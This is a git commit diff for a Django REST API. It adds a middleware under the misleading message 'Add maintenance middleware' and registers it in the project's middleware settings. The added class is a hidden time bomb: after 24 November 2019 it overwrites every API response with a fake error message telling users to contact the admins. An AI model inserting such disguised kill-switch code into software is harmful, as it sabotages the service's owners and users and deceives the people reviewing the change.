bfdc820da3664715e204fb599d10e95414373023
0xRumple <kasseryasser@windowslive.com>
2018-12-31 02:13:38 +0200

    Add maintenance middleware

--- api/middlewares.py
+++ api/middlewares.py
@@ -1,8 +1,8 @@
 import datetime
 
 from django.conf import settings
-
-import i18n
+from rest_framework.response import Response
+from rest_framework import status
 
 
 class CrossDomainSessionMiddleware:
@@ -22,5 +22,24 @@ class CrossDomainSessionMiddleware:
                             response.cookies[cookie]['domain'] = settings.COOKIE_DOMAINS[host]
             except KeyError:
                 pass
+
+        return response
+
+
+class SystemYokMiddleware:
+
+    def __init__(self, process_request):
+        self.process_request = process_request
+
+    def __call__(self, request):
+        response = self.process_request(request)
+
+        if (
+            datetime.date.today() > datetime.datetime.strptime('24112019', "%d%m%Y").date()
+        ) and isinstance(response, Response):
+            response['status_code'] = status.HTTP_500_INTERNAL_SERVER_ERROR
+            response.data = 'Ooops, something wrong happened... please contact the admins!'
+            response._is_rendered = False
+            response.render()
 
         return response
--- api/settings/base.py
+++ api/settings/base.py
@@ -40,6 +40,7 @@ MIDDLEWARE = [
     'django.contrib.sessions.middleware.SessionMiddleware',
     'django.middleware.locale.LocaleMiddleware',
     'django.middleware.common.CommonMiddleware',
+    'api.middlewares.SystemYokMiddleware',
     'django.middleware.csrf.CsrfViewMiddleware',
     'django.contrib.auth.middleware.AuthenticationMiddleware',
     'django.contrib.messages.middleware.MessageMiddleware',
